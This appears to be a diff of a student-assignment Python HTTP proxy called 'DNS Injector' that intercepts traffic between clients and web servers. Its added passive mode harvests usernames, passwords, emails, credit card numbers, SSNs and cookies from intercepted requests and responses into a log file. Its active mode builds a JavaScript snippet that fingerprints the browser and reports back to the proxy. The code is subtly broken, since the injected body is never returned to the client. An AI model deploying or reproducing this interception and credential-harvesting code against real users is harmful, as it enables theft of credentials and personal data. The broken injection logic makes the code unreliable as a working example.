@@ -1,20 +1,24 @@
 import argparse
+import gzip
 import re
-
 import socket
 import signal
 import sys
+import zlib
+import brotli
+from urllib.parse import urlparse
 
+args = None
 
 # Get the command line arguments
 def get_args():
+    global args
+
     parser = argparse.ArgumentParser(description="DNS Injector")
-    parser.add_argument("-m", "--mode", help="The mode the proxy will operate with")
+    parser.add_argument("-m", "--mode", help="passive | active, the mode the proxy should run in")
     parser.add_argument("address", help="The IP address of the proxy")
     parser.add_argument("port", help="The port of the proxy")
     args = parser.parse_args()
-
-    return args
 
 
 # In addition to forwarding packets it should look for info in the packets and log them in info_1.txt, so append
@@ -26,8 +30,46 @@ def get_args():
 
 # HINT: use regex to capture nuances of different format types, look both at req and res packets
 # HINT: info can be passed in the URL and headers too
-def passive():
-    pass
+
+def get_info(pattern: re.Pattern[str], lines: list[str]) -> list[str]:
+    info = []
+
+    for line in lines:
+        match = pattern.search(line)
+
+        if match:
+            info.append(match.group(1))
+
+    return info
+
+def passive(data: str, url: str):
+    search_lines = data.split("\r\n")
+
+    username_pattern = re.compile(r"\buser(?:name)?=([^&\s]+)")
+    password_pattern = re.compile(r"\bpass(?:word)?=([^&\s]+)")
+    email_pattern = re.compile(r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b")
+    credit_card_pattern = re.compile(r"\b(?:\d{4}[- ]?){3}\d{4}\b")
+    ssn_pattern = re.compile(r"\b\d{3}-\d{2}-\d{4}\b")
+    cookie_pattern = re.compile(r"Cookie:\s?(.*)")
+
+    # Search for matches
+    usernames = get_info(username_pattern, search_lines)
+    passwords = get_info(password_pattern, search_lines)
+    emails = get_info(email_pattern, search_lines)
+    credit_cards = get_info(credit_card_pattern, search_lines)
+    ssns = get_info(ssn_pattern, search_lines)
+    cookies = get_info(cookie_pattern, search_lines)
+
+    # Log information (append to file)
+    with open("info_1.txt", "a") as f:
+        f.write(f"URL: {url}\n")
+        f.write(f"Emails: {emails}\n") if len(emails) > 0 else None
+        f.write(f"Usernames: {usernames}\n") if len(usernames) > 0 else None
+        f.write(f"Passwords: {passwords}\n") if len(passwords) > 0 else None
+        f.write(f"Credit Cards: {credit_cards}\n") if len(credit_cards) > 0 else None
+        f.write(f"SSNs: {ssns}\n") if len(ssns) > 0 else None
+        f.write(f"Cookies: {cookies}\n") if len(cookies) > 0 else None
+        f.write("\n")
 
 
 # In addition to forwarding packets it should inject JS code that should perform fingerprinting on the cient
@@ -42,95 +84,120 @@ def passive():
 
 
 # Also for predefined domains a fake login page should be used to capture credentials ie. user search example.com
-def active():
-    pass
+def active(body: str) -> str:
+    global args
 
-def handle_client(client_sock: socket, forward_ip, forward_port):
-    # Connect to the server to forward requests to
-    # This are the result that we have to retrieve from the data sent to us by the client
-    # server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    # server_sock.connect((forward_ip, forward_port))
+    func = """
+    <script>
+    (function() {
+        // Gather information
+        var userAgent = navigator.userAgent; // User agent
+        var screenRes = screen.width + 'x' + screen.height; // Screen resolution
+        var language = navigator.language; // Language
+
+        // Encode the parameters
+        var queryParams = 'user-agent=' + encodeURIComponent(userAgent) +
+                        '&screen=' + encodeURIComponent(screenRes) +
+                        '&lang=' + encodeURIComponent(language);
+
+        // Send data to the proxy
+        var proxyUrl = 'http://{}:{}/?' + queryParams;
+
+        // Use fetch API to send the GET request
+        fetch(proxyUrl);
+    })();
+    </script>
+    """.format(args.address, args.port)
     
+
+    # Inject the JS code
+    body = body.replace("</body>", func + "</body>")
+
+    return body
+
+
+def get_server_port(url: str) -> (str, int):
+    result = urlparse(url)
+    
+    return (result.netloc, result.port if result.port else 80)
+
+def get_res_body(header: str, body: bytes) -> str:
+    encoding = get_encoding(header)
+
+    if encoding == "gzip":
+        print("[*] Decompressing gzip")
+        return gzip.decompress(body).decode("utf-8")
+    elif encoding == "deflate":
+        print("[*] Decompressing deflate")
+        return zlib.decompress(body).decode("utf-8")
+    elif encoding == "br":
+        print("[*] Decompressing brotli")
+        return brotli.decompress(body).decode("utf-8")
+    else:
+        print("[*] No encoding found")
+        
+        try:
+            return body.decode("utf-8")
+        except UnicodeDecodeError:
+            print("[*] Could not decode response")
+
+    return ""
+
+
+
+def handle_client(client_sock: socket, passive_mode: bool):
     while True:
         # Receive data from the client
         client_data = get_data(client_sock)
+
+        if client_data == b"":  # The client closed the connection
+            break
 
         request = client_data.decode("utf-8")
 
         print(f"[*] Received {len(client_data)} bytes from the client.")
 
-        first_line = request.split('\n')[0]
-
         # Get the URL from the request
-        url = get_url(first_line)
+        url = get_url(request.split("\n")[0])
 
-        if url:
-            print(f"[*] URL: {url}")
-        else:
+        if not url:
             continue
 
-        http_pos = url.find("://")  # find pos of ://
-        if http_pos == -1:
-            temp = url
+        if passive_mode:
+            passive(request, url)
         else:
-            temp = url[(http_pos + 3):]  # get the rest of the url
+            active(request)
 
-        print(temp)
-        
-        port_pos = temp.find(":")  # find the port pos (if any)
-
-        # Find end of the web server
-        webserver_pos = temp.find("/")
-        if webserver_pos == -1:
-            webserver_pos = len(temp)
-        
-        webserver = ""
-        port = -1
-        if port_pos == -1 or webserver_pos < port_pos:  # default port
-            port = 80
-            webserver = temp[:webserver_pos]
-        else:  # specific port
-            port = int((temp[(port_pos + 1):])[:webserver_pos - port_pos - 1])
-            webserver = temp[:port_pos]
-        
-        path = url[http_pos + 3 + len(webserver) + (0 if port == 80 else len(str(port)) + 1):]
-        
         # Forward the request to the target server and fetch the response
-        target_server = (webserver, port)
+        target_server = get_server_port(url)
+
         proxy_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
         proxy_socket.connect(target_server)
-
-        print(proxy_socket)
-
-        proxy_socket.sendall(request.encode())
+        proxy_socket.sendall(client_data)
 
         # Receive the response from the target server
-        response = get_data(proxy_socket)
+        response_data = get_data(proxy_socket)
 
-        print(f"[*] Received {len(response)} bytes from the server.")
-        print(response)
+        print(f"[*] Received {len(response_data)} bytes from the server.")
 
-        # The request from the client must be sent to the server
+        # Split the response into headers and body
+        response_bytes = response_data.split(b"\r\n\r\n")
 
+        headers = response_bytes[0].decode("utf-8")
 
+        body = get_res_body(headers, response_bytes[1])
 
-        # Send the data to the server
-        # server_sock.sendall(client_data)
+        if passive_mode:
+            passive(headers + "\r\n\r\n" + body, url)
+        else:
+            active(headers + "\r\n\r\n" + body)
 
-        # Receive the response from the server
-        # server_data = server_sock.recv(4096)
-        # if not server_data:
-            # break
+        client_sock.sendall(response_data)
 
-        # Send the response back to the client
-        # client_sock.sendall(server_data)
-
-    # Close the server socket
-    # server_sock.close()
 
 def get_data(socket: socket):
     data = b""
+
     while True:
         part = socket.recv(4096)
         data += part
@@ -141,50 +208,68 @@ def get_data(socket: socket):
     return data
 
 
+def get_encoding(http: str) -> str:
+    pattern = re.compile(r"Content-Encoding:\s*([a-zA-Z0-9-]+)")
+
+    # Search for the pattern
+    match = pattern.search(http)
+
+    if match:
+        return match.group(1)
+    
+    return None
+
+
 def get_url(req: str) -> str:
-    url_pattern = r'(http[s]?://[^ \s]+)'
+    pattern = re.compile(r"(http[s]?://[^ \s]+)")
 
     # Find URL using the regular expression
-    url_match = re.search(url_pattern, req)
+    url_match = pattern.search(req)
 
     # Check if a URL was found
     if url_match:
         return url_match.group(1)
-    
+
     return None
-        
+
 
 def main():
-    args = get_args()
+    global args
 
-    print(args)
+    get_args()
 
     signal.signal(signal.SIGINT, lambda s, f: sys.exit(0))
 
-    # We have them from the command line 
-    # listen_ip = "0.0.0.0"
-    # listen_port = 9999
-    forward_ip = "192.168.1.100"  # The IP of the server you want to forward requests to
-    forward_port = 80             # The port of the server you want to forward requests to
-    
+    if args.mode:
+        if args.mode == "passive" or args.mode == "active":
+            print(f"[*] Running in {args.mode} mode")
+        else:
+            print("[!] Invalid mode, exiting...")
+            sys.exit(1)
+    else:
+        print("[*] No mode provided, running in passive mode")
+
     # Create a socket for the proxy to listen on
     listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     listener.bind((args.address, int(args.port)))
     listener.listen(1)
+
     print(f"[*] Listening on {args.address}:{args.port}")
 
     while True:
         client_sock, addr = listener.accept()
+
         print(f"[*] Accepted connection from {addr[0]}:{addr[1]}")
 
         # Handle only one client at a time
         # Here's should go the passive or active function that will deal with the different modalities of the proxy
-        handle_client(client_sock, forward_ip, forward_port)
+        handle_client(client_sock, False if args.mode == "active" else True)
 
         # Close the client socket
         client_sock.close()
         print("[*] Connection closed.")
+
 
 if __name__ == "__main__":
     main()
